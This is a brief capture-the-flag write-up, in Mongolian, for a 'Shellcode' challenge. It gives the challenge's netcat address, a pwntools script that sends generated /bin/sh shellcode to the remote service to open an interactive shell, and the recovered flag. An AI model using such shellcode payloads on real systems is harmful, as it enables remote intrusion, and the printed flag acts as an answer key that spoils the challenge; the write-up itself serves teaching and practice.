## Shellcode

`nc 218.100.84.106 9007`

> **By reamb**

## Writeup

Өмнөх 2 даалгаваруудаас арай өөр бөгөөд өөрсдөө **shell execute** хийх ёстой.
**asm** хэлдээ сайн бол өөрсдөө бичих боломжтой, би тийм ч сайн биш учираас бэлэн байгаа
tool ашиглан хийсэн.

```python
from pwn import *

r = remote('218.100.84.106', 9007)

payload = asm(shellcraft.sh())
r.send(payload)
r.interactive()
```

Дээрх скриптийг ажиллуулахад **command line shell** (Interactive mode буюу`/bin/sh`) рүү орно.
Эндээс `ls`, `cat` коммандуудыг ашиглан тугийг харах боломжтой.

```
Туг: HZ{r3@L_sh3ll_c0de}
```
